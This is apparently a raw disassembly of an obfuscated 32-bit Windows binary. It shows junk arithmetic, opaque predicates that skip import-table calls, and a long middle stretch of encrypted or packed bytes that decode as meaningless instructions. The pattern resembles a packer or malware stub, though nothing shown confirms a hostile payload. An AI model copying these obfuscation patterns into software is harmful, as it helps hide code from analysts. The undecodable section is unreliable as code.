  41faa9:	push   DWORD PTR [ebp-0xc]
  41faac:	call   DWORD PTR ds:0x428e48
  41fab2:	adc    ecx,ecx
  41fab4:	dec    ecx
  41fab5:	movzx  ecx,BYTE PTR ds:0x428163
  41fabc:	sbb    ecx,DWORD PTR ds:0x42825b
  41fac2:	mov    DWORD PTR ds:0x428163,ecx
  41fac8:	xor    DWORD PTR ds:0x4282ab,edx
  41face:	movzx  ecx,WORD PTR ds:0x428263
  41fad5:	or     DWORD PTR ds:0x4282fb,ecx
  41fadb:	xor    ecx,ecx
  41fadd:	add    ecx,DWORD PTR ds:0x42838b
  41fae3:	add    DWORD PTR ds:0x42829f,ecx
  41fae9:	and    ecx,DWORD PTR ds:0x42817b
  41faef:	mov    DWORD PTR [ebp-0x84],0x2c40
  41faf9:	cmp    DWORD PTR ds:0x4281ab,0x0
  41fb00:	mov    ecx,DWORD PTR ds:0x42830f
  41fb06:	mov    DWORD PTR ds:0x428393,edx
  41fb0c:	mov    DWORD PTR ds:0x42816f,ebx
  41fb12:	mov    DWORD PTR ds:0x428317,0x3231
  41fb1c:	jmp    0x41fb72
  41fb21:	not    eax
  41fb23:	cmp    DWORD PTR ds:0x4281ab,0x0
  41fb2a:	jne    0x41fb54
  41fb30:	push   0x4d84
  41fb35:	push   0x8040
  41fb3a:	call   DWORD PTR ds:0x428e4c
  41fb40:	and    ecx,ecx
  41fb42:	mov    ecx,DWORD PTR ds:0x4283b3
  41fb48:	or     ecx,DWORD PTR ds:0x428283
  41fb4e:	mov    DWORD PTR ds:0x4283b3,ecx
  41fb54:	mov    ecx,DWORD PTR ds:0x42817b
  41fb5a:	add    ecx,DWORD PTR ds:0x4283b3
  41fb60:	mov    DWORD PTR ds:0x42817b,ecx
  41fb66:	sbb    DWORD PTR ds:0x42829b,ecx
  41fb6c:	adc    ecx,DWORD PTR ds:0x4282af
  41fb72:	mov    DWORD PTR [ebp-0x18],0x6013
  41fb79:	xor    ecx,DWORD PTR ds:0x42825f
  41fb7f:	mov    DWORD PTR [ebp-0x80],0xc
  41fb86:	or     DWORD PTR ds:0x428267,ecx
  41fb8c:	mov    eax,DWORD PTR [ebp-0x18]
  41fb8f:	sub    DWORD PTR ds:0x42819f,edi
  41fb95:	mov    ecx,DWORD PTR [ebp-0x80]
  41fb98:	or     DWORD PTR ds:0x428297,0x42829b
  41fba2:	xor    edx,edx
  41fba4:	xor    DWORD PTR ds:0x4283ab,0x428313
  41fbae:	div    ecx
  41fbb0:	imul   eax,eax,0x4312
  41fbb6:	add    eax,0x5abe
  41fbbb:	cmp    DWORD PTR ds:0x42837f,0x0
  41fbc2:	mov    DWORD PTR ds:0x4281ab,ebx
  41fbc8:	mov    DWORD PTR ds:0x4283b7,0x6142
  41fbd2:	jmp    0x41fc37
  41fbd7:	mov    DWORD PTR ds:0x428287,0x13f4
  41fbe1:	mov    DWORD PTR ds:0x428187,0x47aa
  41fbeb:	cmp    DWORD PTR ds:0x42837f,0x0
  41fbf2:	jne    0x41fc15
  41fbf8:	push   0x4280ef
  41fbfd:	call   DWORD PTR ds:0x428e50
  41fc03:	and    ecx,DWORD PTR ds:0x428273
  41fc09:	adc    DWORD PTR ds:0x428303,ecx
  41fc0f:	sub    DWORD PTR ds:0x42830b,edi
  41fc15:	mov    ecx,DWORD PTR ds:0x42837b
  41fc1b:	sbb    ecx,DWORD PTR ds:0x42823b
  41fc21:	mov    DWORD PTR ds:0x42837b,ecx
  41fc27:	and    DWORD PTR ds:0x428323,0x55d2
  41fc31:	add    DWORD PTR ds:0x42819f,ecx
  41fc37:	mov    ecx,DWORD PTR [ebp-0x84]
  41fc3d:	adc    DWORD PTR ds:0x42828f,0x1028
  41fc47:	xor    eax,ecx
  41fc49:	or     ecx,DWORD PTR ds:0x42829f
  41fc4f:	xor    edx,edx
  41fc51:	or     ecx,DWORD PTR ds:0x42816b
  41fc57:	mov    ecx,0x5ae
  41fc5c:	sub    DWORD PTR ds:0x428287,0x4356
  41fc66:	div    ecx
  41fc68:	cmp    DWORD PTR ds:0x42823f,0x0
  41fc6f:	mov    ecx,0x1d02
  41fc74:	mov    DWORD PTR ds:0x4282a3,ebx
  41fc7a:	mov    DWORD PTR ds:0x4282b7,0x2746
  41fc84:	mov    DWORD PTR ds:0x428287,edx
  41fc8a:	jmp    0x41fcee
  41fc8f:	mov    DWORD PTR ds:0x42817b,0x6e43
  41fc99:	cmp    DWORD PTR ds:0x42823f,0x0
  41fca0:	jbe    0x41fccb
  41fca6:	push   0x29e8
  41fcab:	push   0x54b0
  41fcb0:	push   DWORD PTR [ebp-0x28]
  41fcb3:	call   DWORD PTR ds:0x428ec4
  41fcb9:	neg    ecx
  41fcbb:	sbb    ecx,DWORD PTR ds:0x4283b3
  41fcc1:	and    DWORD PTR ds:0x42817b,0x42832f
  41fccb:	mov    ecx,DWORD PTR ds:0x428183
  41fcd1:	xor    DWORD PTR ds:0x42824f,ecx
  41fcd7:	movzx  ecx,BYTE PTR ds:0x428297
  41fcde:	sub    DWORD PTR ds:0x4283a3,ecx
  41fce4:	mov    DWORD PTR ds:0x428253,0x7a81
  41fcee:	xor    eax,0x5e8c
  41fcf3:	adc    ecx,0x10d9
  41fcf9:	mov    DWORD PTR [ebp-0x48],eax
  41fcfc:	mov    DWORD PTR [ebp-0x13c],0x7b18
  41fd06:	mov    eax,ds:0x4283b7
  41fd0b:	add    eax,DWORD PTR ds:0x42817f
  41fd11:	mov    ds:0x4283b7,eax
  41fd16:	mov    DWORD PTR [ebp-0x138],0x1169
  41fd20:	xor    ecx,ecx
  41fd22:	mov    DWORD PTR [ebp-0x12c],0x1379
  41fd2c:	cmp    DWORD PTR ds:0x428323,0x0
  41fd33:	mov    ecx,DWORD PTR ds:0x42830b
  41fd39:	mov    ecx,DWORD PTR ds:0x42839b
  41fd3f:	mov    ecx,0x2973
  41fd44:	movzx  ecx,WORD PTR ds:0x42823b
  41fd4b:	jmp    0x41fd9c
  41fd50:	mov    eax,0x21a8
  41fd55:	mov    eax,0x38ee
  41fd5a:	cmp    DWORD PTR ds:0x428323,0x0
  41fd61:	ja     0x41fd84
  41fd67:	push   DWORD PTR [ebp-0x20]
  41fd6a:	call   DWORD PTR ds:0x428e54
  41fd70:	and    ecx,ecx
  41fd72:	xor    DWORD PTR ds:0x428283,0x6e97
  41fd7c:	add    ecx,ecx
  41fd7e:	or     DWORD PTR ds:0x42825f,edx
  41fd84:	mov    ecx,DWORD PTR ds:0x4282c3
  41fd8a:	mov    ecx,DWORD PTR [ecx]
  41fd8c:	sbb    DWORD PTR ds:0x4282af,ecx
  41fd92:	sbb    DWORD PTR ds:0x4283a3,0x42832b
  41fd9c:	mov    eax,DWORD PTR [ebp-0x12c]
  41fda2:	mov    ecx,0x5856
  41fda7:	sub    ecx,eax
  41fda9:	shr    ecx,0x2
  41fdac:	sub    ecx,0x5be6
  41fdb2:	xor    eax,0xe7a
  41fdb7:	mov    eax,DWORD PTR [ebp-0x138]
  41fdbd:	imul   ecx,eax
  41fdc0:	mov    eax,DWORD PTR [ebp-0x13c]
  41fdc6:	sbb    DWORD PTR ds:0x42831f,0x428323
  41fdd0:	and    ecx,eax
  41fdd2:	xor    DWORD PTR ds:0x42818f,edx
  41fdd8:	mov    eax,0x3b18
  41fddd:	sub    eax,ecx
  41fddf:	mov    DWORD PTR [ebp-0xfc],eax
  41fde5:	mov    DWORD PTR [ebp-0x28],0x16d7
  41fdec:	mov    DWORD PTR [ebp-0x134],0x6b4
  41fdf6:	sub    eax,DWORD PTR ds:0x42837f
  41fdfc:	mov    eax,DWORD PTR [ebp-0x134]
  41fe02:	xor    ecx,0x2b1a
  41fe08:	or     eax,0x4f70
  41fe0d:	xor    ecx,ecx
  41fe0f:	add    ecx,DWORD PTR ds:0x42837f
  41fe15:	xor    DWORD PTR ds:0x428387,ecx
  41fe1b:	mov    ecx,DWORD PTR [ebp-0x28]
  41fe1e:	or     eax,ecx
  41fe20:	sub    eax,0x5ff7
  41fe25:	mov    DWORD PTR [ebp-0xc8],eax
  41fe2b:	adc    eax,ecx
  41fe2d:	mov    DWORD PTR [ebp-0xe4],0x5f39
  41fe37:	sub    ecx,ecx
  41fe39:	mov    DWORD PTR [ebp-0xc4],0x6236
  41fe43:	mov    DWORD PTR [ebp-0x7c],0x6ce7
  41fe4a:	cmp    DWORD PTR ds:0x42817f,0x0
  41fe51:	not    DWORD PTR ds:0x4282ab
  41fe57:	mov    DWORD PTR ds:0x428247,edx
  41fe5d:	jmp    0x41feb6
  41fe62:	mov    eax,0x4320
  41fe67:	cmp    DWORD PTR ds:0x42817f,0x0
  41fe6e:	jne    0x41fe8d
  41fe74:	push   DWORD PTR [ebp-0x28]
  41fe77:	call   DWORD PTR ds:0x428e58
  41fe7d:	and    DWORD PTR ds:0x428397,0x4195
  41fe87:	add    ecx,DWORD PTR ds:0x42824f
  41fe8d:	movzx  ecx,WORD PTR ds:0x428327
  41fe94:	and    DWORD PTR ds:0x428303,ecx
  41fe9a:	and    DWORD PTR ds:0x428277,edx
  41fea0:	add    ecx,0x2485
  41fea6:	mov    eax,ds:0x4281bb
  41feab:	mov    ecx,DWORD PTR ds:0x4283ef
  41feb1:	sub    ecx,eax
  41feb3:	and    eax,DWORD PTR [eax+ecx*1]
  41feb6:	mov    DWORD PTR [ebp-0x128],0x7537
  41fec0:	not    ecx
  41fec2:	mov    DWORD PTR [ebp-0x114],0x6985
  41fecc:	movzx  ecx,BYTE PTR ds:0x42819f
  41fed3:	or     DWORD PTR ds:0x4283b3,ecx
  41fed9:	mov    DWORD PTR [ebp-0x14],0x5627
  41fee0:	cmp    DWORD PTR ds:0x42827b,0x0
  41fee7:	mov    ecx,0x306f
  41feec:	mov    DWORD PTR ds:0x42837f,0x1b86
  41fef6:	jmp    0x41ff30
  41fefb:	mov    eax,0x6a49
  41ff00:	mov    DWORD PTR ds:0x4282fb,ecx
  41ff06:	cmp    DWORD PTR ds:0x42827b,0x0
  41ff0d:	jae    0x41ff28
  41ff13:	push   0x428163
  41ff18:	call   DWORD PTR ds:0x428ec8
  41ff1e:	or     ecx,DWORD PTR ds:0x428183
  41ff24:	and    ecx,ecx
  41ff26:	adc    ecx,ecx
  41ff28:	adc    DWORD PTR ds:0x428327,ecx
  41ff2e:	sbb    ecx,ecx
  41ff30:	mov    DWORD PTR [ebp-0x64],0x72e7
  41ff37:	mov    eax,DWORD PTR [ebp-0x14]
  41ff3a:	and    DWORD PTR ds:0x42824b,edi
  41ff40:	add    eax,DWORD PTR [ebp-0x64]
  41ff43:	jmp    0x42029f
  41ff48:	test   DWORD PTR [edx],edi
  41ff4a:	cmp    BYTE PTR [eax+0x2e],ah
  41ff4d:	pop    edx
  41ff4e:	cmp    eax,0x6ff09f1a
  41ff53:	mov    al,0x3d
  41ff55:	fadd   QWORD PTR [ecx+0x162323b0]
  41ff5b:	sbb    BYTE PTR [ebx-0xfe7e7ee],ah
  41ff61:	dec    edx
  41ff62:	mov    cl,0x2f
  41ff64:	jecxz  0x41ffdd
  41ff66:	mov    bh,0xd
  41ff68:	pop    ebx
  41ff69:	sbb    edx,DWORD PTR [esi+0x5]
  41ff6c:	sbb    dh,BYTE PTR [ebp+0x4b6027e9]
  41ff72:	or     al,0x96
  41ff74:	fistp  DWORD PTR [esi]
  41ff76:	and    dl,BYTE PTR [ebp+0x27]
  41ff79:	fdivr  QWORD PTR [ecx+0x7895e6af]
  41ff7f:	shl    DWORD PTR [ecx+0x51],0x67
  41ff83:	arpl   WORD PTR [edx+0x6c],bx
  41ff86:	xor    al,0xdc
  41ff88:	sbb    eax,0xfe682108
  41ff8d:	es pop esp
  41ff8f:	push   es
  41ff90:	fsubr  DWORD PTR [edi]
  41ff92:	loope  0x41ff4b
  41ff94:	sti    
  41ff95:	push   eax
  41ff96:	rcl    edi,1
  41ff98:	(bad)  
  41ff99:	out    dx,al
  41ff9a:	ficom  DWORD PTR [eax]
  41ff9c:	push   0x65936649
  41ffa1:	dec    ebx
  41ffa2:	stos   DWORD PTR es:[edi],eax
  41ffa3:	cwde   
  41ffa4:	loop   0x41ff69
  41ffa6:	nop
  41ffa7:	cmc    
  41ffa8:	xchg   ecx,eax
  41ffa9:	mov    ds:0xe64a77c4,al
  41ffae:	nop    esi
  41ffb1:	xchg   ecx,eax
  41ffb2:	add    al,BYTE PTR [edi-0x8]
  41ffb5:	cwde   
  41ffb6:	iretw  
  41ffb8:	sub    eax,0x621bd79c
  41ffbd:	scas   eax,DWORD PTR es:[edi]
  41ffbe:	pop    esi
  41ffbf:	or     dl,BYTE PTR [ecx-0x630465fa]
  41ffc5:	loop   0x41ffdb
  41ffc7:	shr    DWORD PTR [ecx+0x562caf77],1
  41ffcd:	stos   DWORD PTR es:[edi],eax
  41ffce:	mov    ds:0x4144942b,eax
  41ffd3:	add    ecx,DWORD PTR [edi+0x48652176]
  41ffd9:	out    dx,al
  41ffda:	inc    edx
  41ffdb:	(bad)  [edi]
  41ffdd:	in     al,dx
  41ffde:	leave  
  41ffdf:	inc    ebx
  41ffe0:	outs   dx,BYTE PTR ds:[esi]
  41ffe1:	push   0x6b272ab2
  41ffe6:	pop    esi
  41ffe7:	ffree  st(3)
  41ffe9:	cmc    
  41ffea:	mov    ebp,0x7c92ad5
  41ffef:	gs (bad) 
  41fff1:	and    eax,0xebca047e
  41fff6:	mov    dl,BYTE PTR [edx]
  41fff8:	imul   eax
  41fffa:	push   cs
  41fffb:	dec    esi
  41fffc:	jno    0x41fff4
  41fffe:	inc    ebp
  41ffff:	je     0x420070
  420001:	or     ebp,DWORD PTR [ebx-0x4b0d4f8a]
  420007:	add    al,0x9d
  420009:	fimul  WORD PTR [ebp+0x7c589aec]
  42000f:	jg     0x41fff2
  420011:	jp     0x41fff6
  420013:	frstor [ecx]
  420015:	push   esp
  420016:	ins    BYTE PTR es:[edi],dx
  420017:	leave  
  420018:	add    ebp,DWORD PTR [ebp-0x43]
  42001b:	ins    DWORD PTR es:[edi],dx
  42001c:	ja     0x420071
  42001e:	stos   DWORD PTR es:[edi],eax
  42001f:	jmp    0x1b64:0x17da2b03
  420026:	xchg   esp,eax
  420027:	push   es
  420028:	nop
  420029:	adc    eax,0x7d700dc8
  42002e:	pusha  
  42002f:	ins    DWORD PTR es:[edi],dx
  420030:	jmp    0x41ffe6
  420032:	pop    eax
  420033:	cmp    al,0x62
  420035:	out    0xae,al
  420037:	mov    BYTE PTR [eax-0x39],dl
  42003a:	js     0x42006f
  42003c:	sbb    eax,0x4e38f563
  420041:	and    edi,DWORD PTR [ebp+0x44]
  420044:	dec    ebp
  420045:	dec    esi
  420046:	add    al,0xb8
  420048:	ss into 
  42004a:	rcl    BYTE PTR [esi],0xc7
  42004d:	test   BYTE PTR [edi+0x69],ah
  420050:	sbb    BYTE PTR [eax+0x50476eb2],ch
  420056:	dec    ebx
  420057:	sub    ebx,DWORD PTR [ebx+0x25fd45e4]
  42005d:	popf   
  42005e:	jp     0x420054
  420060:	cmp    ecx,eax
  420062:	div    ebp
  420064:	push   ss
  420065:	inc    ebp
  420066:	hlt    
  420067:	mov    ds:0x1e46db71,eax
  42006c:	leave  
  42006d:	pusha  
  42006e:	or     ah,BYTE PTR [eax-0x22]
  420071:	adc    ah,bl
  420073:	or     cl,BYTE PTR [ebx]
  420075:	imul   ebx,DWORD PTR [ebx+0x1cb0bcd9],0xf95deb9e
  42007f:	arpl   cx,si
  420081:	sub    ecx,0x5dd5de30
  420087:	jb     0x4200f7
  420089:	mov    edx,0xa5743f6b
  42008e:	ins    DWORD PTR es:[edi],dx
  42008f:	nop
  420090:	and    edx,DWORD PTR [esi+0x62]
  420093:	shr    DWORD PTR [ebp+0x20140842],cl
  420099:	push   0xffffffc1
  42009b:	lds    esp,FWORD PTR [ebp+0x36099ad4]
  4200a1:	repz push esi
  4200a3:	sub    cl,ah
  4200a5:	into   
  4200a6:	aaa    
  4200a7:	xchg   esp,ecx
  4200a9:	test   edi,0x58b2c272
  4200af:	dec    ebp
  4200b0:	cmp    BYTE PTR [esi+0x50c3d42b],bh
  4200b6:	gs sahf 
  4200b8:	(bad)  
  4200b9:	cmp    eax,esi
  4200bb:	xchg   BYTE PTR ss:[edi-0x28],ah
  4200bf:	inc    edi
  4200c0:	mov    esp,0xd675394d
  4200c5:	xchg   esi,eax
  4200c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4200c7:	mov    esi,0x8baf38ce
  4200cc:	rcr    BYTE PTR [eax],1
  4200ce:	mov    esi,0xc9933246
  4200d3:	cwde   
  4200d4:	adc    bh,al
  4200d6:	adc    DWORD PTR [eax],eax
  4200d8:	jae    0x420108
  4200da:	rol    DWORD PTR [eax],cl
  4200dc:	ds push ss
  4200de:	sbb    BYTE PTR [ebx],al
  4200e0:	xlat   BYTE PTR ds:[ebx]
  4200e1:	jp     0x4200c7
  4200e3:	cld    
  4200e4:	pop    eax
  4200e5:	int3   
  4200e6:	ret    
  4200e7:	fbld   TBYTE PTR [ebx+0x1f]
  4200ea:	ins    BYTE PTR es:[edi],dx
  4200eb:	jns    0x4200a3
  4200ed:	lea    edx,[edi-0x4f1c4468]
  4200f3:	push   ebp
  4200f4:	jnp    0x4200ed
  4200f6:	sub    eax,0x54b49d7d
  4200fb:	jg     0x4200a7
  4200fd:	fsub   DWORD PTR [ebx-0x41066a9]
  420103:	cmp    DWORD PTR [esi+0x7],0xd58874
  42010a:	jecxz  0x42013b
  42010c:	in     eax,0xca
  42010e:	(bad)  
  42010f:	jnp    0x420111
  420111:	xor    BYTE PTR [ebp+0x30340f6a],al
  420117:	mov    BYTE PTR [ebp+0x6c1ad01c],cl
  42011d:	lods   al,BYTE PTR ds:[esi]
  42011e:	mov    ah,BYTE PTR [ebx]
  420120:	repnz mov ebx,0x8b65ed59
  420126:	mov    DWORD PTR [eax+ebx*1-0x5f],edx
  42012a:	scas   eax,DWORD PTR es:[edi]
  42012b:	mov    bh,BYTE PTR [ecx]
  42012d:	clc    
  42012e:	mov    ds:0xdf332db7,al
  420133:	sar    BYTE PTR [eax-0x46],0xd8
  420137:	dec    ebx
  420138:	push   cs
  420139:	push   esp
  42013a:	mov    edx,0xd103f54e
  42013f:	pop    es
  420140:	and    ebp,edi
  420142:	xor    BYTE PTR [edi+0x2d],ch
  420145:	push   esp
  420146:	popa   
  420147:	push   edx
  420148:	sar    BYTE PTR [eax+eiz*1],1
  42014b:	mov    al,0x43
  42014d:	in     al,0xd8
  42014f:	in     eax,dx
  420150:	mov    dl,0x1b
  420152:	in     eax,0x18
  420154:	test   BYTE PTR [edx+0x79],0xcd
  420158:	and    ebx,DWORD PTR [ebp+0x10]
  42015b:	jns    0x420143
  42015d:	inc    eax
  42015e:	retf   0x91f4
  420161:	lods   al,BYTE PTR ds:[esi]
  420162:	(bad)  
  420163:	jnp    0x420109
  420165:	jp     0x420143
  420167:	shl    ebp,cl
  420169:	jl     0x420168
  42016b:	add    bh,cl
  42016d:	lods   al,BYTE PTR ds:[esi]
  42016e:	fdivr  QWORD PTR [ecx+0x11]
  420171:	push   edx
  420172:	inc    esi
  420173:	imul   esi,DWORD PTR [edx],0x21
  420176:	call   0xd066b3d5
  42017b:	sbb    dl,0x84
  42017e:	push   ebx
  42017f:	dec    edi
  420180:	test   DWORD PTR [ebx+0x9],ebx
  420183:	pop    ecx
  420184:	lahf   
  420185:	or     DWORD PTR [eax+edi*4+0x59],ebx
  420189:	stc    
  42018a:	lods   eax,DWORD PTR ds:[esi]
  42018b:	mov    WORD PTR [ebp-0x2c4e58d],fs
  420191:	rol    ah,cl
  420193:	inc    esi
  420194:	jae    0x420199
  420196:	jle    0x420138
  420198:	cwde   
  420199:	add    bh,BYTE PTR [edx-0x72]
  42019c:	mov    ebx,0xf81433d7
  4201a1:	idiv   BYTE PTR [edx+0x4881765d]
  4201a7:	stc    
  4201a8:	lds    eax,FWORD PTR [ebp-0x17220e0a]
  4201ae:	jmp    0x1f24:0x36e9cf40
  4201b5:	adc    esp,eax
  4201b7:	ins    BYTE PTR es:[edi],dx
  4201b8:	mov    ah,0xb4
  4201ba:	jecxz  0x420144
  4201bc:	aad    0xe4
  4201be:	stos   BYTE PTR es:[edi],al
  4201bf:	xchg   edi,eax
  4201c0:	mov    al,0x79
  4201c2:	retf   0xd1f3
  4201c5:	jns    0x42016d
  4201c7:	xor    edx,DWORD PTR [eax-0x71520a16]
  4201cd:	js     0x4201c8
  4201cf:	gs jg  0x4201c2
  4201d2:	test   BYTE PTR [ecx],ah
  4201d4:	out    dx,eax
  4201d5:	(bad)
  4201d8:	ins    DWORD PTR es:[edi],dx
  4201d9:	inc    edx
  4201da:	cs loop 0x420238
  4201dd:	shl    DWORD PTR [edx-0x6a4a9840],cl
  4201e3:	push   esi
  4201e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4201e5:	pop    esp
  4201e6:	adc    DWORD PTR [ebx+ebx*2-0x21],edi
  4201ea:	lods   eax,DWORD PTR ds:[esi]
  4201eb:	fmul   DWORD PTR [ecx]
  4201ed:	pop    ebp
  4201ee:	leave  
  4201ef:	dec    edx
  4201f0:	pop    edx
  4201f1:	inc    ecx
  4201f2:	imul   eax,esp,0x5b
  4201f5:	int    0xd5
  4201f7:	push   0x2b4b5f16
  4201fc:	js     0x420215
  4201fe:	in     eax,0x95
  420200:	and    ecx,ebx
  420202:	aad    0xfd
  420204:	not    DWORD PTR [edx-0x68ea4e44]
  42020a:	mov    esi,0x9b41498f
  42020f:	push   ebp
  420210:	adc    al,0xd9
  420212:	dec    edx
  420213:	out    0x53,al
  420215:	mov    ebp,0x49fcdee7
  42021a:	lods   eax,DWORD PTR ds:[esi]
  42021b:	inc    esp
  42021c:	aam    0xe
  42021e:	aad    0xb9
  420220:	xor    DWORD PTR [edi-0x62675945],0xb2fe0ce3
  42022a:	or     al,0x92
  42022c:	dec    edi
  42022d:	mov    ebx,cs
  42022f:	jle    0x4201de
  420231:	repnz fbld TBYTE PTR [eax+0x43]
  420235:	jno    0x4201fe
  420237:	pop    ecx
  420238:	pop    es
  420239:	dec    eax
  42023a:	mov    ebp,0x8a8eca53
  42023f:	pusha  
  420240:	xor    eax,0x14a854b
  420245:	popf   
  420246:	in     eax,dx
  420247:	cli    
  420248:	in     al,dx
  420249:	repnz or eax,0xa8c38799
  42024f:	or     eax,0xc8c5a971
  420254:	cdq    
  420255:	push   0xc4a90229
  42025a:	and    edx,0x83a4d1e1
  420260:	sahf   
  420261:	jnp    0x420236
  420263:	xchg   ecx,eax
  420264:	adc    DWORD PTR [esi+esi*8+0x53],ebx
  420268:	jno    0x420257
  42026a:	mov    ebx,0x6fcc75bb
  42026f:	xor    al,0x35
  420271:	and    dl,BYTE PTR [eax-0x3173863a]
  420277:	ins    BYTE PTR es:[edi],dx
  420278:	fistp  WORD PTR [eax+0x50]
  42027b:	dec    BYTE PTR [eax-0x55]
  42027e:	sub    al,0xec
  420280:	mov    bl,ch
  420282:	jae    0x42029b
  420284:	loop   0x420265
  420286:	ret    
  420287:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420288:	icebp  
  420289:	xor    ecx,DWORD PTR [ecx+eax*8+0x5ef4c6b]
  420290:	(bad)  
  420291:	push   ds
  420292:	not    DWORD PTR [edi+0x3f]
  420295:	mov    eax,0x9d5f1ecd
  42029a:	xor    BYTE PTR [edx-0x748e218b],al
  4202a0:	(bad)  
  4202a1:	in     al,dx
  4202a2:	(bad)  
  4202a3:	(bad)  
  4202a4:	inc    DWORD PTR [ecx+0x42829f0d]
  4202aa:	add    BYTE PTR [ebx],bl
  4202ac:	add    DWORD PTR [edx+0x0],0x2b
  4202b0:	ror    DWORD PTR [ebx+0x4283970d],0x0
  4202b7:	add    DWORD PTR ds:0x42831f,ecx
  4202bd:	mov    ecx,DWORD PTR [ebp-0x128]
  4202c3:	imul   eax,ecx
  4202c6:	imul   eax,eax,0xe4e
  4202cc:	mov    ecx,DWORD PTR [ebp-0x7c]
  4202cf:	or     eax,ecx
  4202d1:	and    DWORD PTR ds:0x42839b,ebx
  4202d7:	mov    ecx,DWORD PTR [ebp+0x8]
  4202da:	sub    DWORD PTR ds:0x428177,0x428297
  4202e4:	lea    eax,[ecx+eax*1+0x46210209]
  4202eb:	add    DWORD PTR ds:0x42838b,0x42816f
  4202f5:	push   eax
  4202f6:	add    DWORD PTR ds:0x428283,0x42823b
  420300:	call   0x414116
  420305:	cmp    DWORD PTR ds:0x42831b,0x0
  42030c:	mov    DWORD PTR ds:0x428273,edx
  420312:	mov    esi,DWORD PTR ds:0x42823b
  420318:	mov    DWORD PTR ds:0x428317,ebx
  42031e:	mov    DWORD PTR ds:0x428327,0x5564
  420328:	jmp    0x420388
  42032d:	mov    DWORD PTR ds:0x428193,0x3019
  420337:	not    DWORD PTR ds:0x42831b
  42033d:	cmp    DWORD PTR ds:0x42831b,0x0
  420344:	jae    0x42036f
  42034a:	push   DWORD PTR [ebp-0x24]
  42034d:	push   0x42837b
  420352:	push   DWORD PTR [ebp-0x1c]
  420355:	push   DWORD PTR [ebp-0xc]
  420358:	push   0x6e6a
  42035d:	call   DWORD PTR ds:0x428ecc
  420363:	adc    ecx,DWORD PTR ds:0x428253
  420369:	xor    DWORD PTR ds:0x42830f,edx
  42036f:	add    ecx,esi
  420371:	mov    ecx,DWORD PTR ds:0x42822b
  420377:	mov    esi,DWORD PTR ds:0x4282e3
  42037d:	sub    esi,ecx
  42037f:	and    ecx,DWORD PTR [ecx+esi*1]
  420382:	sbb    DWORD PTR ds:0x428197,ecx
  420388:	mov    ecx,eax
  42038a:	mov    eax,DWORD PTR [ebp-0xc4]
  420390:	add    esi,0x7195
  420396:	imul   eax,eax,0x21b3
  42039c:	sbb    DWORD PTR ds:0x42830b,ebx
  4203a2:	add    eax,DWORD PTR [ebp-0xe4]
  4203a8:	and    eax,0xd5c
  4203ad:	cmp    DWORD PTR ds:0x428387,0x0
  4203b4:	mov    DWORD PTR ds:0x4282af,ebx
  4203ba:	mov    esi,0x156a
  4203bf:	movzx  esi,WORD PTR ds:0x4281ab
  4203c6:	jmp    0x420422
  4203cb:	mov    DWORD PTR ds:0x42826f,0x2dc
  4203d5:	mov    DWORD PTR ds:0x42826b,edi
  4203db:	cmp    DWORD PTR ds:0x428387,0x0
  4203e2:	jae    0x420410
  4203e8:	push   0x427fff
  4203ed:	call   DWORD PTR ds:0x428ed0
  4203f3:	movzx  esi,WORD PTR ds:0x428187
  4203fa:	add    DWORD PTR ds:0x428307,esi
  420400:	adc    DWORD PTR ds:0x4281a7,ebx
  420406:	add    DWORD PTR ds:0x428383,0x22a2
  420410:	and    esi,DWORD PTR ds:0x428383
  420416:	or     DWORD PTR ds:0x42837f,ecx
  42041c:	sbb    esi,DWORD PTR ds:0x428303
  420422:	sub    eax,0x2e81
  420427:	cmp    DWORD PTR ds:0x428283,0x0
  42042e:	mov    DWORD PTR ds:0x428383,0x5615
  420438:	mov    DWORD PTR ds:0x42817b,0x419b
  420442:	mov    DWORD PTR ds:0x42819f,0x389d
  42044c:	not    DWORD PTR ds:0x428273
  420452:	jmp    0x4204b6
  420457:	mov    esi,0x7b57
  42045c:	cmp    DWORD PTR ds:0x428283,0x0
  420463:	je     0x4204a0
  420469:	push   0x42824f
  42046e:	push   DWORD PTR [ebp-0x24]
  420471:	call   DWORD PTR ds:0x428ed4
  420477:	sub    DWORD PTR ds:0x428307,0x6950
  420481:	movzx  esi,WORD PTR ds:0x42827b
  420488:	xor    esi,DWORD PTR ds:0x42832b
  42048e:	mov    DWORD PTR ds:0x42827b,esi
  420494:	mov    esi,DWORD PTR ds:0x428263
  42049a:	or     DWORD PTR ds:0x4282ff,esi
  4204a0:	xor    DWORD PTR ds:0x42832f,ecx
  4204a6:	add    DWORD PTR ds:0x42832f,ebx
  4204ac:	or     DWORD PTR ds:0x428387,0x793c
  4204b6:	xor    edx,edx
  4204b8:	add    DWORD PTR ds:0x42819b,0xc98
  4204c2:	mov    esi,0x2f1dc
  4204c7:	div    esi
  4204c9:	xor    edx,edx
  4204cb:	xor    eax,0x56ef
  4204d0:	add    ecx,eax
  4204d2:	adc    DWORD PTR ds:0x42817f,ebx
  4204d8:	mov    DWORD PTR [ebp-0x90],ecx
  4204de:	sbb    DWORD PTR ds:0x4283b7,0x2859
  4204e8:	mov    DWORD PTR [ebp-0xe0],0x7a31
  4204f2:	mov    DWORD PTR [ebp-0x44],0x2514
  4204f9:	cmp    DWORD PTR ds:0x42819b,0x0
  420500:	mov    DWORD PTR ds:0x428303,0x6f69
  42050a:	mov    edx,0x2839
  42050f:	jmp    0x42057e
  420514:	movzx  ecx,WORD PTR ds:0x42829f
  42051b:	cmp    DWORD PTR ds:0x42819b,0x0
  420522:	jne    0x420555
  420528:	push   0x1336
  42052d:	push   DWORD PTR [ebp-0xc]
  420530:	push   0x75c6
  420535:	push   0x3ce6
  42053a:	push   DWORD PTR [ebp-0x1c]
  42053d:	call   DWORD PTR ds:0x428ed8
  420543:	mov    esi,DWORD PTR ds:0x42818b
  420549:	sbb    DWORD PTR ds:0x4281a7,esi
  42054f:	and    DWORD PTR ds:0x4282a3,edx
  420555:	sbb    DWORD PTR ds:0x428257,edx
  42055b:	mov    esi,DWORD PTR ds:0x42838f
  420561:	or     DWORD PTR ds:0x428393,esi
  420567:	mov    esi,DWORD PTR ds:0x4281b7
  42056d:	mov    edx,DWORD PTR ds:0x42834f
  420573:	sub    esi,edx
  420575:	and    esi,DWORD PTR [esi+edx*1]
  420578:	adc    DWORD PTR ds:0x42838f,edx
  42057e:	mov    DWORD PTR [ebp-0xdc],0x699c
  420588:	mov    DWORD PTR [ebp-0xd8],0x1
  420592:	adc    esi,eax
